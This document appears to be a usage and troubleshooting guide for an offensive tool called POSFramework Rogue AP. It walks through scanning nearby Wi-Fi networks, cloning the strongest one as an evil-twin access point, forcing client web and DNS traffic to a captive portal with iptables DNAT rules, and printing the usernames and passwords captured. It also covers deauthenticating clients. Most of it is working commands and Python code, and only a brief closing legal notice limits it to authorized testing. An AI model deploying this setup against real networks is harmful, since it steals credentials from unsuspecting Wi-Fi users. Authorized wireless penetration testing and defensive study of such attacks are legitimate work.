# POSFramework Rogue AP - Integration & Troubleshooting Guide

## Quick Start

### 1. Initial Setup (One-time)

```bash
# Navigate to project directory
cd /path/to/kiro

# Run hostapd installation and setup
sudo bash hostapd_setup.sh

# Validate installation
sudo ./hostapd_configs/validate_hostapd.sh
```

### 2. List Available Wireless Interfaces

```bash
# Check all interfaces
iwconfig

# Check AP-capable interfaces
iw list | grep -A 10 "Supported interface modes" | grep AP

# Alternative: use helper script
python3 posframework/hostapd_helper.py interfaces
```

### 3. Start Rogue AP (Standalone)

```bash
# Open network
sudo ./hostapd_configs/start_rogue_ap.sh wlan1 "FreeWiFi" 6

# WPA2-secured network
sudo ./hostapd_configs/start_rogue_ap.sh wlan1 "CorporateWiFi" 6 "Password123"
```

### 4. Start with Full Credential Capture (Recommended)

```bash
# Automatic - uses POSFramework for credential harvesting
sudo bash deploy_rogue_ap.sh wlan1 "TargetNetwork" 6 false "" 300

# With WPA2 protection
sudo bash deploy_rogue_ap.sh wlan1 "TargetNetwork" 6 true "SecurePass123" 300
```

### 5. Stop and Cleanup

```bash
# Automatic cleanup
sudo ./hostapd_configs/cleanup_rogue_ap.sh

# Or manual
sudo killall hostapd dnsmasq
sudo iptables -F
sudo iptables -t nat -F
sudo ip addr flush dev wlan1
```

## Integration with POSFramework

### Method 1: Programmatic Integration

```python
#!/usr/bin/env python3
from posframework.rogueap import RogueAPEngine
from posframework.database import POSDatabase
from posframework.recon import ReconEngine
import time

# Initialize
db = POSDatabase("pos_recon_data.db")
recon = ReconEngine(interface="wlan0mon", db=db)

# Scan for targets first (optional)
recon.start(timeout=10)

# Get strongest network
target = db.get_strongest_ap()
if target:
    print(f"Target: {target[1]} on channel {target[2]}")
else:
    print("No targets found")
    exit(1)

# Create rogue AP from recon data
rogue_ap = RogueAPEngine.from_recon_db(
    interface="wlan1",
    db=db,
    target_bssid=target['bssid']
)

# Optional: secure with WPA2
rogue_ap.use_wpa = True
rogue_ap.wpa_passphrase = "CustomPassword123"

# Start the AP
if rogue_ap.start():
    print("Rogue AP active - waiting for client connections...")
    time.sleep(300)  # Run for 5 minutes
    rogue_ap.stop()
    
    # Query captured credentials
    creds = db.get_credentials()
    for cred in creds:
        print(f"Captured: {cred['username']} / {cred['password']}")
```

### Method 2: Command-Line Deployment

```bash
# Deploy with automatic detection
sudo bash deploy_rogue_ap.sh wlan1 "TargetSSID" 6 true "PassPhrase" 600
```

### Method 3: Manual Step-by-Step

```bash
# 1. Create config directory
mkdir -p /tmp/posframework_ap

# 2. Generate configs
python3 posframework/hostapd_helper.py generate "FreeWiFi" 6

# 3. Manual startup
sudo ip link set wlan1 down
sudo ip addr add 10.0.0.1/24 dev wlan1
sudo ip link set wlan1 up

sudo hostapd -B /tmp/hostapd-rogue.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf &

# 4. Setup traffic redirect
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p udp --dport 53 -j DNAT --to-destination 10.0.0.1:53

# 5. Start POSFramework
python3 -m posframework --mode rogueap --interface wlan1 --ssid "FreeWiFi" --channel 6
```

## Troubleshooting

### Problem: hostapd won't start

**Symptoms:**
- "hostapd: unknown error -1" 
- Interface drops immediately
- "ioctl[SIOCSIWMODE]: Operation not permitted"

**Solutions:**

1. Check interface supports AP mode:
```bash
iw list | grep -A 10 "Supported interface modes"
# Look for "AP" in output
```

2. Verify driver is loaded:
```bash
lsmod | grep nl80211
lsmod | grep mac80211
```

3. Check interface is not already in use:
```bash
# Find conflicting processes
lsof -i :80
lsof -i :53
netstat -tln | grep :80
ps aux | grep hostapd
ps aux | grep dnsmasq
```

4. Try reloading driver:
```bash
sudo modprobe -r iwlwifi
sudo modprobe iwlwifi
sudo ip link set wlan1 up
```

5. Check interface status:
```bash
iwconfig wlan1
iw dev wlan1 info
```

### Problem: "dnsmasq failed to bind port 53"

**Symptoms:**
- "dnsmasq: failed to bind port 53: Address already in use"
- DNS queries not responding

**Solutions:**

1. Stop conflicting services:
```bash
sudo systemctl stop systemd-resolved
sudo systemctl stop dnsmasq
sudo killall dnsmasq
```

2. Check what's using the port:
```bash
sudo lsof -i :53
sudo netstat -tlnp | grep 53
```

3. Restart after cleanup:
```bash
sudo killall -9 systemd-resolved
sudo dnsmasq -C /tmp/dnsmasq.conf &
```

### Problem: Clients can't connect to AP

**Symptoms:**
- AP broadcasts but no clients connect
- "No networks" or "Network unavailable"

**Checking:**

1. Verify hostapd is running:
```bash
pgrep hostapd
ps aux | grep hostapd
```

2. Check AP status:
```bash
sudo hostapd_cli -i wlan1 status
```

3. Verify SSID is broadcasting:
```bash
# From another device
iwlist wlan0 scan | grep -A 5 FreeWiFi
```

4. Check channel for interference:
```bash
# Scan for other APs on same channel
sudo iwlist wlan0 scan | grep -E "Frequency|SSID"
```

5. Verify interface is up and configured:
```bash
ip link show wlan1
ip addr show wlan1
iwconfig wlan1
```

### Problem: Clients connect but can't get IP (DHCP issue)

**Symptoms:**
- AP connects but "No IP Address"
- "Obtaining IP Address..." stuck

**Solutions:**

1. Verify dnsmasq is running:
```bash
pgrep dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf -d  # -d for debug
```

2. Check IP forwarding is enabled:
```bash
cat /proc/sys/net/ipv4/ip_forward  # Should be 1
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

3. Verify interface configuration:
```bash
ip addr show wlan1  # Should have 10.0.0.1/24
```

4. Check iptables NAT rules:
```bash
sudo iptables -t nat -L -n -v
```

5. Monitor DHCP requests:
```bash
sudo tcpdump -i wlan1 -nn "udp port 67 or udp port 68"
```

### Problem: Clients connect but no internet / captive portal not showing

**Symptoms:**
- IP assigned successfully
- DNS works
- Captive portal doesn't appear

**Solutions:**

1. Verify iptables rules:
```bash
sudo iptables -t nat -L -n -v
# Should show DNAT rules for ports 80, 443, 53
```

2. Test port redirect:
```bash
# On AP server (10.0.0.1)
sudo nc -l -p 80  # Listen on port 80

# From client
curl http://example.com/
# Should connect to port 80 on 10.0.0.1
```

3. Check captive portal is running:
```bash
lsof -i :80  # Should show Python process or http server
curl http://10.0.0.1/
```

4. View portal logs:
```bash
sudo tail -f /var/log/dnsmasq.log
ps aux | grep python | grep -i portal
```

### Problem: Interface disappears or goes down randomly

**Symptoms:**
- Interface becomes unavailable
- "Device not found"
- AP stops working after a few minutes

**Solutions:**

1. Check interface status:
```bash
ip link show wlan1
iwconfig wlan1
```

2. Bring interface back up:
```bash
sudo ip link set wlan1 up
```

3. Check for rfkill blocks:
```bash
sudo rfkill list
sudo rfkill unblock all
```

4. Check kernel messages:
```bash
sudo dmesg | tail -20
journalctl -f -u hostapd
```

5. Disable power saving:
```bash
sudo iw dev wlan1 set power_save off
```

### Problem: Low signal or poor client performance

**Symptoms:**
- Clients at short distance have weak signal
- Slow data rates
- High latency

**Solutions:**

1. Increase transmit power:
```ini
# In hostapd.conf, add:
tx_power_level=20
```

2. Optimize channel settings:
```ini
# For 2.4 GHz, use wider channels
ht_capab=[SHORT-GI-20][SHORT-GI-40][HT40+][HT40-][DSSS_CCK-40]
```

3. Change channel to less congested:
```bash
# Scan for interference
sudo iwlist wlan0 scan | grep Frequency | sort | uniq -c

# Use less crowded channel (1, 6, or 11 for 2.4 GHz)
```

4. Try 5 GHz instead:
```ini
hw_mode=a
channel=36
ieee80211ac=1
```

## Advanced Configuration

### Logging and Debugging

```bash
# Run hostapd with debug output
sudo hostapd -dd -f /var/log/hostapd-debug.log /tmp/hostapd-rogue.conf &

# Monitor dnsmasq
sudo tail -f /var/log/dnsmasq.log

# Sniff traffic
sudo tcpdump -i wlan1 -w /tmp/ap-traffic.pcap

# Monitor iptables hits
sudo watch -n 1 'iptables -t nat -L -n -v'
```

### Performance Tuning

```ini
# hostapd.conf - Performance settings
max_num_sta=256
rts_threshold=2347
frag_threshold=2346
dtim_period=1
beacon_int=50
tx_power_level=20
ht_capab=[HT40-][HT40+][SHORT-GI-20][SHORT-GI-40]
```

### Security Hardening

```ini
# hostapd.conf - Security
ap_isolate=1              # Isolate clients from each other
wpa_strict_rekey=1        # Strict key rekey
ieee80211w=2              # Require MFP
```

## Integration with POSFramework Recon

```python
# Workflow: Scan → Identify Target → Deploy Rogue AP → Harvest Credentials

from posframework.recon import ReconEngine
from posframework.rogueap import RogueAPEngine
from posframework.database import POSDatabase

db = POSDatabase("pos_recon_data.db")

# Step 1: Reconnaissance
recon = ReconEngine(db=db)
recon.scan_networks(interface="wlan0mon", duration=20)

# Step 2: Identify target
targets = db.cursor.execute(
    'SELECT bssid, ssid, channel, signal FROM access_points ORDER BY signal DESC LIMIT 5'
).fetchall()

for bssid, ssid, channel, signal in targets:
    print(f"{ssid} ({bssid}): Ch {channel}, Signal {signal}")

# Step 3: Deploy rogue AP
selected_bssid = targets[0][0]
rogue_ap = RogueAPEngine.from_recon_db(
    interface="wlan1",
    db=db,
    target_bssid=selected_bssid
)

# Step 4: Start and harvest
rogue_ap.start()
print("Rogue AP active - waiting for credentials...")
time.sleep(600)
rogue_ap.stop()

# Step 5: Analyze
creds = db.get_credentials_by_ip()
for ip, credentials in creds.items():
    print(f"Client {ip}: {len(credentials)} credential(s) captured")
```

## Monitoring and Management

### Real-time Status

```bash
# Monitor connected clients
watch -n 1 'hostapd_cli -i wlan1 list_sta'

# Monitor traffic
sudo iftop -i wlan1

# Check DHCP leases
watch -n 1 'cat /var/lib/dnsmasq/dnsmasq.leases'
```

### Client Management

```bash
# List connected clients
hostapd_cli -i wlan1 list_sta

# Get client info
hostapd_cli -i wlan1 sta <MAC_ADDRESS>

# Deauthenticate client
hostapd_cli -i wlan1 deauthenticate <MAC_ADDRESS>

# Set max clients
# Edit hostapd.conf: max_num_sta=50
```

## Testing & Validation

### Pre-deployment Checklist

- [ ] Wireless interface supports AP mode (`iw list`)
- [ ] nl80211 driver loaded (`lsmod | grep nl80211`)
- [ ] hostapd installed (`which hostapd`)
- [ ] dnsmasq installed (`which dnsmasq`)
- [ ] iptables available (`which iptables`)
- [ ] Interface is not in use (`ps aux | grep hostapd`)
- [ ] Ports 53, 80, 443 are available (`sudo lsof -i`)

### Post-deployment Validation

```bash
# From another device:

# 1. See the AP
iwlist wlan0 scan | grep -A 3 "SSID: FreeWiFi"

# 2. Connect to it
sudo iwconfig wlan0 essid "FreeWiFi"

# 3. Wait for DHCP
sudo dhclient wlan0

# 4. Check connection
ping 10.0.0.1

# 5. Test DNS
nslookup example.com 10.0.0.1

# 6. Access captive portal
curl http://example.com/
```

## Support and References

- [Hostapd Documentation](https://w1.fi/hostapd/)
- [Dnsmasq Manual](http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html)
- [Linux Wireless Documentation](https://wireless.kernel.org/)
- [nl80211 Reference](https://wireless.kernel.org/en/developers/documentation/nl80211)

## Important Notes

⚠️ **Legal Notice:**
- Only use on networks you own or have explicit permission to test
- Respect local wireless regulations and laws
- Unauthorized access to computer networks is illegal
- This tool is for authorized penetration testing only

## Quick Reference

```bash
# Complete workflow
sudo bash hostapd_setup.sh                                    # Setup
sudo ./hostapd_configs/validate_hostapd.sh                  # Verify
sudo bash deploy_rogue_ap.sh wlan1 "Target" 6 false "" 300  # Deploy
sudo ./hostapd_configs/cleanup_rogue_ap.sh                  # Cleanup

# Generate configs programmatically  
python3 posframework/hostapd_helper.py generate "SSID" 6    # Open network
python3 posframework/hostapd_helper.py generate "SSID" 6 "Pass"  # WPA2
```
